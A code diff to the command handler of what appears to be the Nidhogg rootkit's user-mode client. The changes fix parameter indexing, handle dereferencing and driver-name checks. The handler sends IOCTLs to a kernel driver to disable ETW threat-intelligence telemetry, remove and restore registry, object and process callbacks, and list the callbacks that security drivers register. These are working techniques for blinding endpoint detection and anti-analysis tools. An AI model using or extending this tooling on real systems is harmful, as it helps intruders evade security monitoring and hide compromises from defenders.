@@ -17,7 +17,7 @@ void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
 	params.erase(params.begin());
 
 	if (commandName.compare("enable_etwti") == 0) {
-		if (params.size() != 1) {
+		if (params.size() != 0) {
 			std::cerr << "Invalid usage" << std::endl;
 			PrintHelp();
 			return;
@@ -29,7 +29,7 @@ void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
 		std::cout << "ETW-TI enabled successfully" << std::endl;
 	}
 	else if (commandName.compare("disable_etwti") == 0) {
-		if (params.size() != 1) {
+		if (params.size() != 0) {
 			std::cerr << "Invalid usage" << std::endl;
 			PrintHelp();
 			return;
@@ -43,20 +43,20 @@ void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
 	else if (commandName.compare("remove_callback") == 0) {
 		DWORD64 callbackAddress = 0;
 
-		if (params.size() != 3) {
+		if (params.size() != 2) {
 			std::cerr << "Invalid usage" << std::endl;
 			PrintHelp();
 			return;
 		}
 		try {
-			callbackAddress = ConvertToNumber<std::string, DWORD64>(params.at(1));
+			callbackAddress = ConvertToNumber<std::string, DWORD64>(params.at(0));
 		}
 		catch (const ConvertorException& e) {
 			std::cerr << e.what() << std::endl;
 			PrintHelp();
 			return;
 		}
-		if (callbackTypeMap.find(params.at(2)) == callbackTypeMap.end()) {
+		if (callbackTypeMap.find(params.at(1)) == callbackTypeMap.end()) {
 			std::cerr << "Invalid callback type" << std::endl;
 			PrintHelp();
 			return;
@@ -67,31 +67,31 @@ void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
 			PrintHelp();
 			return;
 		}
-		if (!RemoveCallback(callbackAddress, callbackTypeMap.at(params.at(2)), true)) {
-			std::cerr << "Failed to remove callback 0x" << std::hex << callbackAddress << " of type " << params.at(2) << std::endl;
+		if (!RemoveCallback(callbackAddress, callbackTypeMap.at(params.at(1)), true)) {
+			std::cerr << "Failed to remove callback 0x" << std::hex << callbackAddress << " of type " << params.at(1) << std::endl;
 			std::cout << std::dec << std::endl;
 			return;
 		}
-		std::cout << "Callback 0x" << std::hex << callbackAddress << " of type " << params.at(2) << " removed successfully" << std::endl;
+		std::cout << "Callback 0x" << std::hex << callbackAddress << " of type " << params.at(1) << " removed successfully" << std::endl;
 		std::cout << std::dec << std::endl;
 	}
 	else if (commandName.compare("restore_callback") == 0) {
 		DWORD64 callbackAddress = 0;
 
-		if (params.size() != 3) {
+		if (params.size() != 2) {
 			std::cerr << "Invalid usage" << std::endl;
 			PrintHelp();
 			return;
 		}
 		try {
-			callbackAddress = ConvertToNumber<std::string, DWORD64>(params.at(1));
+			callbackAddress = ConvertToNumber<std::string, DWORD64>(params.at(0));
 		}
 		catch (const ConvertorException& e) {
 			std::cerr << e.what() << std::endl;
 			PrintHelp();
 			return;
 		}
-		if (callbackTypeMap.find(params.at(2)) == callbackTypeMap.end()) {
+		if (callbackTypeMap.find(params.at(1)) == callbackTypeMap.end()) {
 			std::cerr << "Invalid callback type" << std::endl;
 			PrintHelp();
 			return;
@@ -102,19 +102,19 @@ void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
 			PrintHelp();
 			return;
 		}
-		if (!RemoveCallback(callbackAddress, callbackTypeMap.at(params.at(2)), false)) {
-			std::cerr << "Failed to restore callback 0x" << std::hex << callbackAddress << " of type " << params.at(2) << std::endl;
+		if (!RemoveCallback(callbackAddress, callbackTypeMap.at(params.at(1)), false)) {
+			std::cerr << "Failed to restore callback 0x" << std::hex << callbackAddress << " of type " << params.at(1) << std::endl;
 			std::cout << std::dec << std::endl;
 			return;
 		}
-		std::cout << "Callback 0x" << std::hex << callbackAddress << " of type " << params.at(2) << " restored successfully" << std::endl;
+		std::cout << "Callback 0x" << std::hex << callbackAddress << " of type " << params.at(1) << " restored successfully" << std::endl;
 		std::cout << std::dec << std::endl;
 	}
 	else if (commandName.compare("list_registry_callbacks") == 0) {
 		IoctlCallbackList<CmCallback> callbacks;
 		CmCallback currentCallback;
 
-		if (params.size() != 1) {
+		if (params.size() != 0) {
 			PrintHelp();
 			return;
 		}
@@ -136,7 +136,7 @@ void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
 		for (ULONG i = 0; i < callbacks.Count; i++) {
 			currentCallback = callbacks.Callbacks[i];
 
-			if (currentCallback.DriverName)
+			if (strlen(currentCallback.DriverName) > 0)
 				std::cout << "Driver Name: " << currentCallback.DriverName << std::endl;
 			else
 				std::cout << "Driver Name: Unknown" << std::endl;
@@ -149,17 +149,17 @@ void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
 	else if (commandName.compare("list_ob_callbacks") == 0) {
 		IoctlCallbackList<ObCallback> callbacks;
 
-		if (params.size() != 2) {
+		if (params.size() != 1) {
 			PrintHelp();
 			return;
 		}
-		if (!params.at(1).starts_with("Ob") || callbackTypeMap.find(params.at(1)) == callbackTypeMap.end()) {
+		if (!params.at(0).starts_with("Ob") || callbackTypeMap.find(params.at(0)) == callbackTypeMap.end()) {
 			std::cerr << "Invalid callback type" << std::endl;
 			PrintHelp();
 			return;
 		}
 		try {
-			callbacks = ListObCallbacks(callbackTypeMap.at(params.at(1)));
+			callbacks = ListObCallbacks(callbackTypeMap.at(params.at(0)));
 		}
 		catch (const AntiAnalysisHandlerException& e) {
 			std::cerr << e.what() << std::endl;
@@ -170,10 +170,10 @@ void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
 			std::cerr << "No object callbacks found or failed to list them" << std::endl;
 			return;
 		}
-		std::cout << "Object callbacks of type " << params.at(1) << ":" << std::endl;
+		std::cout << "Object callbacks of type " << params.at(0) << ":" << std::endl;
 
 		for (ULONG i = 0; i < callbacks.Count; ++i) {
-			if (callbacks.Callbacks[i].DriverName)
+			if (strlen(callbacks.Callbacks[i].DriverName) > 0)
 				std::cout << "Driver Name: " << callbacks.Callbacks[i].DriverName << std::endl;
 			else
 				std::cout << "Driver Name: Unknown" << std::endl;
@@ -186,17 +186,17 @@ void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
 	else if (commandName.compare("list_ps_routines") == 0) {
 		IoctlCallbackList<PsRoutine> routines;
 
-		if (params.size() != 2) {
+		if (params.size() != 1) {
 			PrintHelp();
 			return;
 		}
-		if (!params.at(1).starts_with("Ps") || callbackTypeMap.find(params.at(1)) == callbackTypeMap.end()) {
+		if (!params.at(0).starts_with("Ps") || callbackTypeMap.find(params.at(0)) == callbackTypeMap.end()) {
 			std::cerr << "Invalid callback type" << std::endl;
 			PrintHelp();
 			return;
 		}
 		try {
-			routines = ListPsRoutines(callbackTypeMap.at(params.at(1)));
+			routines = ListPsRoutines(callbackTypeMap.at(params.at(0)));
 		}
 		catch (const AntiAnalysisHandlerException& e) {
 			std::cerr << e.what() << std::endl;
@@ -207,11 +207,11 @@ void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
 			std::cerr << "No PS routines found or failed to list them" << std::endl;
 			return;
 		}
-		std::cout << "PS routines of type " << params.at(1) << ":" << std::endl;
+		std::cout << "PS routines of type " << params.at(0) << ":" << std::endl;
 
 		for (ULONG i = 0; i < routines.Count; ++i) {
 			
-			if (routines.Callbacks[i].DriverName)
+			if (strlen(routines.Callbacks[i].DriverName) > 0)
 				std::cout << "Driver Name: " << routines.Callbacks[i].DriverName << std::endl;
 			else
 				std::cout << "Driver Name: Unknown" << std::endl;
@@ -239,7 +239,7 @@ void AntiAnalysisHandler::HandleCommand(_In_ std::string command) {
 */
 bool AntiAnalysisHandler::EnableDisableEtwTi(_In_ bool enable) {
 	DWORD returned = 0;
-	return DeviceIoControl(hNidhogg.get(), IOCTL_ENABLE_DISABLE_ETWTI, &enable, sizeof(enable), nullptr, 0, &returned, nullptr);
+	return DeviceIoControl(*hNidhogg.get(), IOCTL_ENABLE_DISABLE_ETWTI, &enable, sizeof(enable), nullptr, 0, &returned, nullptr);
 }
 
 /*
@@ -261,7 +261,7 @@ bool AntiAnalysisHandler::RemoveCallback(_In_ ULONG64 callbackAddress, _In_ Call
 	callback.CallbackAddress = callbackAddress;
 	callback.Type = callbackType;
 	callback.Remove = remove;
-	return DeviceIoControl(hNidhogg.get(), IOCTL_REMOVE_RESTORE_CALLBACK, &callback, sizeof(callback), nullptr, 0, &returned, nullptr);
+	return DeviceIoControl(*hNidhogg.get(), IOCTL_REMOVE_RESTORE_CALLBACK, &callback, sizeof(callback), nullptr, 0, &returned, nullptr);
 }
 
 /*
@@ -279,7 +279,7 @@ IoctlCallbackList<CmCallback> AntiAnalysisHandler::ListRegistryCallbacks() {
 	callbacks.Count = 0;
 	DWORD returned = 0;
 
-	if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_REGCALLBACKS, &callbacks, sizeof(callbacks), &callbacks, 
+	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_REGCALLBACKS, &callbacks, sizeof(callbacks), &callbacks, 
 		sizeof(callbacks), &returned, nullptr)) {
 		throw AntiAnalysisHandlerException("Failed to list registry callbacks");
 	}
@@ -291,7 +291,7 @@ IoctlCallbackList<CmCallback> AntiAnalysisHandler::ListRegistryCallbacks() {
 		catch (const SafeMemoryException& e) {
 			throw AntiAnalysisHandlerException(e.what());
 		}
-		if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_REGCALLBACKS, &callbacks, sizeof(callbacks), &callbacks,
+		if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_REGCALLBACKS, &callbacks, sizeof(callbacks), &callbacks,
 			sizeof(callbacks), &returned, nullptr)) {
 			SafeFree(callbacks.Callbacks);
 			throw AntiAnalysisHandlerException("Failed to list registry callbacks");
@@ -316,7 +316,7 @@ IoctlCallbackList<ObCallback> AntiAnalysisHandler::ListObCallbacks(_In_ Callback
 	callbacks.Type = callbackType;
 	callbacks.Count = 0;
 
-	if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_OBCALLBACKS, &callbacks, sizeof(callbacks), &callbacks, 
+	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_OBCALLBACKS, &callbacks, sizeof(callbacks), &callbacks, 
 		sizeof(callbacks), &returned, nullptr))
 		throw AntiAnalysisHandlerException("Failed to list object callbacks");
 
@@ -327,7 +327,7 @@ IoctlCallbackList<ObCallback> AntiAnalysisHandler::ListObCallbacks(_In_ Callback
 		catch (const SafeMemoryException& e) {
 			throw AntiAnalysisHandlerException(e.what());
 		}
-		if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_OBCALLBACKS, &callbacks, sizeof(callbacks), &callbacks, 
+		if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_OBCALLBACKS, &callbacks, sizeof(callbacks), &callbacks, 
 			sizeof(callbacks), &returned, nullptr)) {
 			SafeFree(callbacks.Callbacks);
 			throw AntiAnalysisHandlerException("Failed to list object callbacks");
@@ -348,9 +348,10 @@ IoctlCallbackList<ObCallback> AntiAnalysisHandler::ListObCallbacks(_In_ Callback
 */
 IoctlCallbackList<PsRoutine> AntiAnalysisHandler::ListPsRoutines(_In_ CallbackType callbackType) {
 	IoctlCallbackList<PsRoutine> routines{};
+	routines.Type = callbackType;
 	DWORD returned = 0;
 
-	if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_PSROUTINES, &routines, sizeof(routines), &routines, 
+	if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_PSROUTINES, &routines, sizeof(routines), &routines, 
 		sizeof(routines), &returned, nullptr)) {
 		throw AntiAnalysisHandlerException("Failed to list ps routines");
 	}
@@ -362,7 +363,7 @@ IoctlCallbackList<PsRoutine> AntiAnalysisHandler::ListPsRoutines(_In_ CallbackTy
 		catch (const SafeMemoryException& e) {
 			throw AntiAnalysisHandlerException(e.what());
 		}
-		if (!DeviceIoControl(hNidhogg.get(), IOCTL_LIST_PSROUTINES, &routines, sizeof(routines), &routines,
+		if (!DeviceIoControl(*hNidhogg.get(), IOCTL_LIST_PSROUTINES, &routines, sizeof(routines), &routines,
 			sizeof(routines), &returned, nullptr)) {
 			SafeFree(routines.Callbacks);
 			throw AntiAnalysisHandlerException("Failed to list ps routines");
